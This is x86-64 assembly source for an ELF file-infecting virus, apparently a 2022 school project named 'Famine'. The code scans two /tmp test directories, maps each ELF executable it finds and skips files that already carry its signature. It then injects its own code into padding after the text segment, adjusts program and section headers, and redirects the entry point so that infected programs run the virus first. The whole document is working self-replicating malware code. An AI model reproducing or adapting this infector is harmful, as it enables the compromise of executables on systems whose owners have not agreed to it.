				extern			sc_get_full_path
				extern			sc_map_file
				extern			sc_check_infection
				extern			sc_str_n_cmp
				extern			sc_write_pad

				default			rel
sc:
				push			rbp
				mov				rbp,					rsp

				mov				rbx,					11 * 8 + 3 * 1024
				sub				rsp,					rbx					; glob @ +24

				push			rdi
				push			rsi
				push			rdx

				xor				rcx,					rcx
.loop:
				cmp				rcx,					rbx
				je				.end

				mov				byte[rsp+24+rcx],		0
				inc				rcx
				jmp				.loop
.end:
				mov				rdi,					sc_data
				and				rdi,					0xfffffffffffff000
				mov				rsi,					sc_data_end - sc_data
				add				rsi,					0x1000
				mov				rax,					10
				syscall

				mov				qword[sc_glob],			rsp
				add				qword[sc_glob],			24

				mov				rdi,					sc_dir_1
				call			sc_proc_dir

				mov				rdi,					sc_dir_2
				call			sc_proc_dir

				pop				rdx
				pop				rsi
				pop				rdi

				mov				rsp,					rbp
				pop				rbp

				jmp				qword[sc_real_entry]	
sc_proc_dir:
				push			rbp
				mov				rbp,					rsp

				sub				rsp,					8	; +8 dir_fd
				push			rdi							; +0 *dir

				mov				rsi,					0x10000
				mov				rax,					2
				syscall

				cmp				rax,					0
				jl				.end

				mov				qword[rsp+8],			rax
.loop:
				mov				rdi,					qword[rsp+8]
				mov				rsi,					qword[sc_glob]
				add				rsi,					0x860
				mov				rdx,					0x400
				mov				rax,					78
				syscall

				cmp				rax, 					0
				jle				.close_end

				mov				rdi,					rax
				mov				rsi,					qword[rsp]
				call			sc_proc_entries

				jmp				.loop
.close_end:
				mov				rdi,					qword[rsp+8]
				mov				rax,					3
				syscall
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_proc_entries:
				push			rbp
				mov				rbp,					rsp

				sub				rsp,					8		; +16 ent_ptr
				push			rdi								; +8 dir_ret
				push			rsi								; +0 root_path

				mov				rdx,					qword[sc_glob]
				add				rdx,					0x860
				mov				qword[rsp+16],			rdx
.loop:
				cmp				qword[rsp+8],			0	
				je				.end
				
				mov				rdi,					qword[rsp]
				mov				rsi,					qword[rsp+16]
				add				rsi,					18
				mov				rdx,					qword[sc_glob]
				add				rdx,					0x60
				call			sc_get_full_path

				mov				rdi,					qword[sc_glob]
				add				rdi,					0x60
				call			sc_map_file

				cmp				rax,					0
				jl				.inc

				mov				rbx,					qword[sc_glob]
				mov				rdx,					qword[rbx+0xc60]
				mov				qword[rbx+0x48],		rdx

				call			sc_check_infection
				cmp				rax,					0
				jl				.unmap
				call			sc_test_elf_hdr
				cmp				rax,					0
				jl				.unmap
				call			sc_find_txt_seg
				cmp				rax,					0
				jl				.unmap

				mov				rdx,					qword[sc_glob]
				mov				rax,					qword[rdx+0x50]	; txt
				mov				rbx,					qword[rdx+0x58] ; nxt

				mov				r8,						qword[rbx+0x8]
				mov				r9,						qword[rbx+0x10]
				mov				qword[rdx+0x38],		r8
				mov				qword[rdx+0x40],		r9
				mov				r8,						qword[rax+0x8]
				mov				r9,						qword[rax+0x10]
				add				r8,						qword[rax+0x20]
				add				r9,						qword[rax+0x28]
				sub				qword[rdx+0x38],		r8
				sub				qword[rdx+0x40],		r9

				call			sc_set_x_pad
				cmp				rax,					0
				jl				.unmap

				call			sc_update_mem

				mov				rdi,					qword[sc_glob]
				add				rdi,					0x60
				call			sc_write_mem
.unmap:
				mov				rsi,					qword[sc_glob]
				mov				rdi,					qword[rsi+0xc60]
				mov				rsi,					qword[rsi+0x18]
				mov				rax,					11
				syscall
.inc:
				mov				rdx,					qword[rsp+16]
				xor				rbx,					rbx
				mov				bx,						word[rdx+16]

				sub				qword[rsp+8],			rbx
				add				qword[rsp+16],			rbx
				jmp				.loop
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_update_mem:
				mov				rdi,					qword[sc_glob]
				mov				r8,						qword[rdi+0x50] ;hdrs.txt
				mov				r9,						qword[rdi+0x48]	;hdrs.elf

				mov				rdx,					qword[r8+0x10]
				add				rdx,					qword[r8+0x28]
				mov				qword[sc_entry],		rdx
				
				mov				rdx,					qword[r9+0x18]
				mov				qword[sc_real_entry],	rdx
				
				mov				rdx,					qword[sc_entry]
				mov				qword[r9+0x18],			rdx
				
				mov				rsi,					qword[rdi+0x30]
				add				qword[r8+0x20],			rsi
				add				qword[r8+0x28],			rsi
				
				ret
sc_set_x_pad:
				mov				rdi,					qword[sc_glob]
				mov				r8,						qword[rdi+0x48]	;*hdrs.elf
				mov				r9,						qword[rdi+0x50]	;*hdrs.txt
				mov				r10,					qword[r9+0x8]
				add				r10,					qword[r9+0x20]	;hdrs.txt->p_offset + hdrs.txt->p_filesz
				mov				r11,					qword[rdi+0xc60]
				add				r11,					qword[r8+0x20]

				mov				rsi,					qword[rdi+0x30]
				cmp				qword[rdi+0x38],		rsi
				jae				.success

				cmp				qword[rdi+0x40],		rsi
				jb				.error

				xor				rcx,					rcx
				mov				rdx,					r11
 .first_loop:
 				cmp				cx,						word[r8+0x38]
				je				.init_sec_loop

				cmp				qword[rdx+0x8],			r10
				jb				.first_inc

				add				qword[rdx+0x8],			0x1000
  .first_inc:
				inc				rcx
				add				rdx,					56
				jmp				.first_loop
 .init_sec_loop:
 				xor				rcx,					rcx
				mov				rdx,					r11
 .second_loop:
 				cmp				cx,						word[r8+0x40]
				je				.set_pad

				cmp				qword[rdx+0x18],		r10
				jb				.second_inc
				
				add				qword[rdx+0x18],		0x1000
  .second_inc:
  				inc				rcx
				add				rdx,					64
				jmp				.second_loop
 .set_pad:
 				mov				qword[rdi+0xc68],		1
 .success:
 				xor				rax,					rax
				ret
 .error:
 				mov				rax,					-1
				ret
sc_find_txt_seg:
				mov				rdi,					qword[sc_glob]
				mov				r9,						qword[rdi+0x48];*hdrs.elf

				xor				rcx,					rcx
				mov				rsi,					qword[rdi+0xc60]
				add				rsi,					qword[r8+0x20]
 .loop:
 				cmp				qword[rdi+0x50],		0
				jne				.check_error

				cmp				rcx,					qword[r9+0x38]
				je				.check_error

				cmp				dword[rsi],				1
				jne				.end_loop

				mov				edx,					dword[rsi+0x4]
				and				edx,					0x1
				cmp				edx,					1
				jb				.end_loop

				mov				qword[rdi+0x50],		rsi
  .end_loop:
				inc				rcx
				add				rsi,					56
				jmp				.loop
 .check_error:
 				cmp				qword[rdi+0x50],		0
				je				.error

				cmp				rcx,					qword[r9+0x38]
				je				.error
 .end:
 				xor				rax,					rax
				ret
 .error:
 				mov				rax,					-1
				ret
sc_check_infection:
				push			rbp
				mov				rbp,					rsp
				
				mov				r8,						qword[sc_glob]

				cmp				qword[r8+0x18],			49
				jb				.error

				mov				rdi,					qword[r8+0xc60]
				add				rdi,					qword[r8+0x18]
				sub				rdi,					49
				lea				rsi,					[sc_sign]
				mov				rdx,					49
				call			sc_str_n_cmp

				cmp				rax,					0
				jne				.end

 .error:
 				mov				rax,					-1
 .end:
 				mov				rsp,					rbp
				pop				rbp
				ret
sc_test_elf_hdr:
				push			rbp
				mov				rbp,					rsp
				
				mov				r8,						qword[sc_glob]
				mov				r9,						qword[r8+0x48]; *hdrs.elf

				lea				rdi,					[r8+0x48]
				lea				rsi,					[sc_ident]
				mov				rdx,					5
				call			sc_str_n_cmp

				cmp				rax,					0
				jne				.error

				cmp				word[r9+0x12],			62
				jne				.error

				cmp				word[r9+0x3e],			0
				je				.error

				cmp				word[r9+0x3e],			65535
				je				.error

				cmp				word[r9+0x10],			2
				xor				rax,					rax
				je				.end

				cmp				word[r9+0x10],			3
				jne				.error
				xor				rax,					rax
 .end:
 				mov				rsp,					rbp
				pop				rbp
				ret
 .error:
 				mov				rax,					-1
				jmp				.end
sc_write_mem:
				push			rbp
				mov				rbp,					rsp
				sub				rsp,					80	;	+0x0	dst
															;	+0x8	code_offset
															;	+0x10	sz.mem
															;	+0x18	sz.load
															;	+0x20	sz.f_pad
															;	+0x28	*hdrs.txt
															;	+0x30	mem
															;	+0x38	x_pad
															;	+0x40	sz.mem - (code_offset + sz.f_pad)
				mov				r8,						qword[sc_glob]
				mov				r9,						qword[r8+0x18]
				mov				qword[rsp+0x10],		r9
				mov				r9,						qword[r8+0x30]
				mov				qword[rsp+0x18],		r9
				mov				r9,						qword[r8+0x38]
				mov				qword[rsp+0x20],		r9
				mov				r9,						qword[r8+0x50]
				mov				qword[rsp+0x28],		r9
				mov				r9,						qword[r8+0xc60]
				mov				qword[rsp+0x30],		r9
				mov				r9,						qword[r8+0xc68]
				mov				qword[rsp+0x38],		r9
				mov				r9,						qword[rsp+0x10]
				sub				r9,						qword[rsp+0x8]
				sub				r9,						qword[rsp+0x20]
				mov				qword[rsp+0x40],		r9

				mov				rax,					2
				mov				rsi,					1
				syscall

				mov				qword[rsp],				rax
				mov				r9,						qword[rsp+0x28]; *hdrs.txt

				mov				rdi,					qword[rsp]
				mov				rsi,					qword[rsp+0x30]

				mov				rdx,					qword[r9+0x8]
				add				rdx,					qword[r9+0x20]
				sub				rdx,					qword[rsp+0x10]
				mov				qword[rsp+8],			rdx

				mov				rax,					1
				syscall

				cmp				rax,					0
				jl				.close
				
				cmp				rax,					qword[rsp+8]
				jne				.close

				mov				r8,						qword[sc_glob]

				mov				rdi,					qword[rsp]
				lea				rsi,					[sc]
				mov				rdx,					qword[r8+0x18]
				mov				rax, 					1
				syscall
			
				cmp				rax,					0
				jl				.close

				cmp				rax,					qword[rsp+0x18]
				jne				.close

				mov				rdi,					qword[rsp]

				mov				rsi,					qword[rsp+0x38]
				xor				rsi,					rsi
				xor				rbx,					rbx
				mov				ebx,					0x1000
				imul			esi,					ebx
				add				rsi,					qword[rsp+0x20]
				sub				rsi,					qword[rsp+0x18]
				call			sc_write_pad

				cmp				rax,					0
				jne				.close

				mov				rdi,					qword[rsp]
				mov				rsi,					qword[rsp+0x30]
				add				rsi,					qword[rsp+0x8]
				add				rsi,					qword[rsp+0x20]

				mov				rdx,					qword[rsp+0x40]
				mov				rax,					1
				syscall

				cmp				rax,					0
				jl				.close

				cmp				rax,					qword[rsp+0x40]
				jne				.close

				mov				rdi,					qword[rsp]
				lea				rsi,					[sc_sign]
				mov				rdx,					49
				mov				rax,					1
				syscall
 .close:
 				mov				rdi,					qword[rsp]
				mov				rax,					3
				syscall
 .end:
 				add				rsp,					80
 				mov				rsp,					rbp	
				pop				rbp
				ret
sc_end:

sc_data:
sc_dir_1:
				db				"/tmp/test/", 0
sc_dir_2:
				db				"/tmp/test2/", 0
sc_entry:
				dq				sc
sc_real_entry:
				dq				sc_first_real_entry
sc_sign:
				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
sc_ident:
				db				"\x7f"
				db				"ELF"
				db				"\x2"
sc_glob:
				dq				0	; +0x18 -> sz.mem
									; +0x20 -> sz.code
									; +0x28 -> sz.data
									; +0x30 -> sz.load
									; +0x38 -> sz.f_pad
									; +0x40 -> sz.m_pad

									; +0x48 -> *hdrs.elf
									; +0x50 -> *hdrs.txt
									; +0x58 -> *hdrs.nxt
									
									; +0x60 -> buffs.path
									; +0x460 -> buffs.zeros
									; +0x860 -> buffs.entry

									; +0xc60 -> *mem
									; +0xc68 -> x_pad
sc_data_end:

sc_first_real_entry:
				xor				rdi,				rdi
				mov				rax,				60
				syscall
